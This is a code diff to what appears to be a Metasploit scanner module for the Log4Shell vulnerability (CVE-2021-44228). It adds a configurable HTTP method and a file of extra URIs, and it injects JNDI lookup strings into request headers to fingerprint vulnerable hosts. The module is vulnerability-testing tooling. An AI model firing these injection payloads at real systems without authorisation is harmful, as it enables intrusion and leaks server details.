@@ -20,11 +20,13 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
       OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
       OptPath.new('HEADERS_FILE', [
         true, 'File containing headers to check',
         File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
       ]),
+      OptPath.new('URIS_FILE', [ false, 'File containing additional URIs to check' ])
     ])
   end
 
@@ -79,8 +81,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Fingerprint a single host
-  def run_host(_ip)
-    method = 'GET'
+  def run_host(ip)
+    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?
+
+    return if datastore['URIS_FILE'].blank?
+
+    File.open(datastore['URIS_FILE'], 'rb').lines.each do |uri|
+      uri.strip!
+      next if uri.start_with?('#')
+
+      run_host_uri(ip, normalize_uri(target_uri, uri))
+    end
+  end
+
+  def run_host_uri(_ip, uri)
+    method = datastore['HTTP_METHOD']
     headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
     headers_file.lines.each do |header|
       header.strip!
@@ -90,12 +105,12 @@ class MetasploitModule < Msf::Auxiliary
       @tokens[token] = {
         rhost: rhost,
         rport: rport,
-        target_uri: normalize_uri(target_uri),
+        target_uri: uri,
         method: method,
         header: header
       }
       send_request_raw({
-        'uri' => normalize_uri(target_uri),
+        'uri' => uri,
         'method' => method,
         # https://twitter.com/404death/status/1470243045752721408
         'headers' => { header => jndi_string("#{token}/${sys:java.vendor}_${sys:java.version}") }
